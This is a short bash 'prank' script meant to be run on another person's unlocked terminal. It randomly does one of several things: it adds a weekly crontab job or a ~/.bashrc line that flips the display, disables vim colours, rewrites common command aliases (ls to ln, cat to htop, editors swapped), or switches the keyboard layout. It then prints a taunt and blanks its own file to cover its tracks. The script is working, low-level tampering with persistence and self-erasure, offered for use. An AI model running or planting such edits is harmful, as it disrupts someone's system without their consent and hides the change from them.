#!/bin/bash
#############################
#        Prank file         #
#   by Sebastian Paaske     #
# ######################### #
# That'll teach ya to lock  #
#      your terminal.       #
# ######################### #
#   http://prank.coq.dk     #
#############################

RANDOM=`date '+%s'`

case $[$RANDOM % 7] in
    0) # Mirror the display weekly
        crontab -l | sed '$a\@weekly /usr/bin/xrandr --display $DISPLAY --reflect xy' | crontab -
        xrandr --display $DISPLAY --reflect xy
        ;;
    1) # Mirror the display every time a bash shell is started
        echo 'xrandr --display $DISPLAY --reflect xy' >> ~/.bashrc
        xrandr --display $DISPLAY --reflect xy
        ;;
    2) # Remove VIM colors
        echo '" Improve color scheme' >> ~/.vimrc
        echo 'set t_Co=0' >> ~/.vimrc
        ;;
    3) # Screw up aliases
        echo '# Helpful aliases' >> ~/.bashrc
        echo "alias ls=`which ln`" >> ~/.bashrc
        echo "alias ln=`which man`" >> ~/.bashrc
        echo "alias man=`which cat`" >> ~/.bashrc
        echo "alias cat=`which htop`" >> ~/.bashrc
        echo "alias python=`which perl`" >> ~/.bashrc
        # Let the editor wars begin
        echo "alias emacs=`which vim`" >> ~/.bashrc
        echo "alias emacsclient=`which vim`" >> ~/.bashrc
        echo "alias vim=`which emacs`" >> ~/.bashrc
        echo "alias gvim=`which emacs`" >> ~/.bashrc
        echo "alias vi=`which emacs`" >> ~/.bashrc
        echo "alias nano=`which gedit`" >> ~/.bashrc
        echo "alias ed=`which gedit`" >> ~/.bashrc
        echo "alias gedit=`which nano`" >> ~/.bashrc
        ;;
    4) # Set keyboard layout to dvorak
        setxkbmap dvorak
        ;;
    5) # Set keyboard layout to colemak
        setxkbmap colemak
        ;;
    6) # Set keyboard layout to turkish
        setxkbmap tr
        ;;
esac

clear
echo "Hello there. Nice to meet you."
echo "You might want to remember to lock your screen next time."

# Clear the script
echo '' > "$0"
